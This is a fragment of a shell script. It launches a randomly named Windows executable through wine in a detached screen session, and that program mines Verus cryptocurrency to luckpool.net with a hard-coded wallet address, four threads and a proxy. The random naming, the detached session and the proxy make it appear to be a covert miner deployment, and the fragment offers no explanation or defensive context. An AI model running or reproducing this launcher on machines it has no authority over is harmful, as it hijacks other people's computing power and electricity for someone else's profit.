...
screen -d -m bash -c "wine $random_name.exe -a verus -o stratum+tcp://eu.luckpool.net:3960 -u RV66gw7B2BsfrFeUZ65wVgxzDxRvuSqJnw.beluttgacor -p d=8192S -t 4 --proxy=$proxy_url"
